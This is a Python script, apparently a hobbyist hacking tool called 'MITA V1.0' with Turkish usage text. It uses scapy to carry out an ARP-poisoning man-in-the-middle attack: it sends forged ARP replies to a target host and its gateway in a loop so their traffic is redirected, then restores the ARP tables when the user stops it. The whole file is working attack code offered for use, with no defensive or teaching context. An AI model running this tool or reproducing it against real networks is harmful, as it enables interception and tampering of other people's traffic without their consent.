import scapy.all as scapy
import time
import optparse
import sys
from colorama import Fore, Style

def print_usage():
    print(Fore.RED + """
     
   __  __ ___ _____  _    
 |  \/  |_ _|_   _|/ \   
 | |\/| || |  | | / _ \  
 | |  | || |  | |/ ___ \ 
 |_|  |_|___| |_/_/   \_\
                         
        
         
           """ + Style.RESET_ALL)    
    
    print(Fore.RED + "MITA V1.0 | Coder Telegram: pizza_0day" + Style.RESET_ALL)
    print("Kullanım:")
    print("  python3 mita.py -t <target_ip> -g <gateway_ip>")
    print("Açıklama:")
    print("  -t, --target : Hedef IP adresi")
    print("  -g, --gateway : Ağ geçidi IP adresi")
    print("Örnek:")
    print("  python3 mita.py -t 192.168.1.5 -g 192.168.1.1")
    sys.exit()

if len(sys.argv) == 1:
    print_usage()

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    
    arp_response_to_fooled = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip)
    arp_response_to_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=fooled_ip)
    
    scapy.send(arp_response_to_fooled, verbose=False, count=6)
    scapy.send(arp_response_to_gateway, verbose=False, count=6)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", dest="target_ip", help="Target IP address")
    parse_object.add_option("-g", dest="gateway_ip", help="Gateway IP address")
    
    (options, args) = parse_object.parse_args()
    
    if not options.target_ip:
        print("Enter target IP")
        exit()
    
    if not options.gateway_ip:
        print("Enter gateway IP")
        exit()
    
    return options

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    number = 0
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        number += 2
        print("\rSending packets " + str(number), end="")
        time.sleep(3)

except KeyboardInterrupt:
    print('\nQuit')
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)